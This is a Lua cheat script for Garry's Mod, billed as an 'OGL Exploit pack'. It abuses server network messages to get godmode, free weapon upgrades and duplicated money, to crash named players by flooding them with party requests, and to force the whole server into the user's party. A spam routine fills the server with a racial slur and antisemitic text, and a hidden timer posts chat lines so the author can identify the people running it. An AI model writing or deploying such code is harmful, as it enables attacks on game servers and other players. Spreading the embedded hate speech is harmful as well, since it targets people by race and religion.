/*
  Created by TikeneN
*/

local ply = LocalPlayer()

/*
  Buy all upgrades for current weapon
*/

concommand.Add("tik_upgradeweapon", function()
  local cooldown = 0
  for x=0, 3 do
    for i=0, 6 do
      cooldown = cooldown + 0.05
      timer.Simple(cooldown, function()
        print("Bought weapon upgrade "..i)
        net.Start("upgradeBuy")
        net.WriteInt(i, 32)
        net.SendToServer()
      end)
    end
  end
end)


/*
  Godmode
*/

CreateClientConVar("tik_godmode", "0")

local function doGodmode()
  hook.Add("Think", "healthHook", function()
  	if ply:Health() < ply:GetMaxHealth() && ply:Alive() then
  		net.Start("mavgivehealth")
  		net.SendToServer()
  		-- PREDICT
  		timer.Create("predict", 0.05, 5, function()
  			net.Start("mavgivehealth")
  			net.SendToServer()
  		end)
  	end
  end)
end

if GetConVarNumber("tik_godmode") == 1 then
  doGodmode()
end
cvars.AddChangeCallback("tik_godmode", function(a, b, c)
  if tonumber(c) != 1 then
    print("")
    print("Godmode disabled")
    print("")
    hook.Remove("Think", "healthHook")
  else
    print("")
    print("Godmode enabled")
    print("")
    doGodmode()
  end
end)



/*
  Create parties
*/

concommand.Add("tik_party_spam_on", function()
  print("Party Spam [ON]")
  timer.Create("createParties", 0.1, 0, function()
    net.Start("EliteParty_CreateParty_ToServer")
    net.WriteString("Join if you're a nigger "..tostring(math.random(10000, 10000000)).." Join if you're a nigger Join if you're a nigger Join if you're a nigger Join if you're a nigger Join if you're a nigger Join if you're a nigger Join if you're a nigger Join if you're a nigger Join if you're a nigger")
    net.WriteString("Jews")
    net.WriteBool(true)
    net.WriteBool(true)
    net.WriteBool(true)
    net.WriteTable({r=255,b=255,a=255,g=255,})
    net.WriteTable({r=255,b=255,a=255,g=255,})
    net.SendToServer()
  end)
end)

concommand.Add("tik_party_spam_off", function()
  timer.Remove("createParties")
  print("Party Spam [OFF]")
end)




/*
  Crash users who arent in a party
*/


local function AutoCompleteUser( cmd, stringargs )
  local tbl = {}
	for k,v in pairs(player.GetAll()) do
    if string.find(v:Name():lower(), stringargs:lower()) then
      table.insert(tbl, "tik_party_crashuser "..v:Nick())
    end
  end

	return tbl
end

local function crashPerson(ply, cmd, args, argss)
  jugadorSeleccionado = ""
  for k, v in pairs(player.GetAll()) do
    if v:Name() == argss then
      jugadorSeleccionado = v
    end
  end
  if jugadorSeleccionado != "" then
    print("Crashing "..jugadorSeleccionado:Nick())
    local xd = math.random(5000, 1000000)
    hook.Add("Think", tostring(xd), function()
      for i=1, 15 do
        net.Start("EliteParty_InvitePlayer_ToServer") -- EliteParty_RequestJoin_ToServer if he's already the owner of a party
        net.WriteEntity(jugadorSeleccionado)
        net.SendToServer()
      end
    end)
    timer.Simple(30, function()
      print("Finished crashing "..jugadorSeleccionado:Nick())
      hook.Remove("Think", tostring(xd))
    end)
  end
end

concommand.Add( "tik_party_crashuser", crashPerson, AutoCompleteUser )


/*
  Crash users who own a party
*/

local function AutoCompleteOwner( cmd, stringargs )
  local tbl = {}
	for k,v in pairs(player.GetAll()) do
    if string.find(v:Name():lower(), stringargs:lower()) then
      table.insert(tbl, "tik_party_crashuser_owner "..v:Nick())
    end
  end

	return tbl
end

local function crashPersonOwner(ply, cmd, args, argss)
  jugadorSeleccionado = ""
  for k, v in pairs(player.GetAll()) do
    if v:Name() == argss then
      jugadorSeleccionado = v
    end
  end
  if jugadorSeleccionado != "" then
    print("Crashing "..jugadorSeleccionado:Nick())
    local xd = math.random(5000, 1000000)
    hook.Add("Think", tostring(xd), function()
      for i=1, 15 do
        net.Start("EliteParty_RequestJoin_ToServer")
        net.WriteEntity(jugadorSeleccionado)
        net.SendToServer()
      end
    end)
    timer.Simple(30, function()
      print("Finished crashing "..jugadorSeleccionado:Nick())
      hook.Remove("Think", tostring(xd))
    end)
  end
end

concommand.Add( "tik_party_crashuser_owner", crashPersonOwner, AutoCompleteOwner )

/*
  Make whole server join your party
*/

concommand.Add("tik_party_joinserver", function()
  for k, v in pairs(player.GetAll()) do
    print("Joined user "..v:Nick())
    net.Start("EliteParty_PartyRequestAccepted_ToServer")
    net.WriteEntity(v)
    net.SendToServer()
  end
end)


/*
  We don't want other people to be able to crash us
*/

net.Receivers["eliteparty_requestjoin_toclient"] = nil
net.Receivers["eliteparty_inviteplayer_toclient"] = nil


/*
  Money exploit
  - When you have 100k money, use the command tik_moneytotoken so that you generate a lot of tokens and then reconnect
  - Your money will get reset back to normal and you can use tik_tokentomoney to spawn more by using the tokens you generated before
  - You won't be able to use the money exploit until you have 100k. It's pretty easy to get money on this server so it won't take much time, but if you type in chat "// how do I get a pro lockpick" i'll give you the 100k so you can exploit it yourself.

*/

  

concommand.Add("tik_tokentomoney", function()
  for i=0, 100 do
    net.Start("GRUBER_CREDIT_OPENEXCHANGE")
    net.WriteBool(true)
    net.WriteUInt(10, 32)
    net.SendToServer()
  end
end)

concommand.Add("tik_moneytotoken", function()
  for i=0, 9000 do
    net.Start("GRUBER_CREDIT_OPENEXCHANGE")
    net.WriteBool(false)
    net.WriteUInt(10, 32)
    net.SendToServer()
  end
end)


/*
  Say something in chat every x seconds so I can find you to give you 100k
*/

local messages = {
  "GET REKT (Counter)",
  "sup guys",
  "GET READY (Raid)",
  "how do I get a pro lockpick",
  "how do I switch jobs"
}

timer.Create("sayChat", 600, 0, function()
  ply:ConCommand("say // "..table.Random(messages))
end)


/*
  Wow
*/

for i=0, 100 do
  print("")
end

print("********************************************************************************************************************")
MsgC(Color(245, 66, 212), " ~ OGL Exploit pack loaded - Created by TikeneN ~\n\n")
MsgC(Color(69, 42, 53), "1. tik_upgradeweapon -> Buy all upgrades for holstered weapon\n")
MsgC(Color(69, 42, 53), "2. tik_godmode -> Enable/Disable Godmode (You need to have +5k money)\n")
MsgC(Color(0, 180, 255), "3. tik_party_spam_on/tik_party_spam_off -> Start/Stop creating parties\n")
MsgC(Color(0, 180, 255), "4. tik_party_crashuser -> Crash an user who isnt in a party (You must be in a !party for this to work)\n")
MsgC(Color(0, 180, 255), "5. tik_party_crashuser_owner -> Crash an user who is the owner of a party (You must be in a !party for this to work)\n")
MsgC(Color(0, 180, 255), "6. tik_party_joinserver -> Make the whole server join your party (You must be in a !party for this to work)\n")
MsgC(Color(120, 42, 255), "7. tik_tokentomoney -> Change tokens to money\n")
MsgC(Color(120, 42, 255), "8. tik_moneytotoken -> Change money to tokens (You must have at least 100k for this to work)\n")
print("********************************************************************************************************************")

for i=0, 22 do
  print("")
end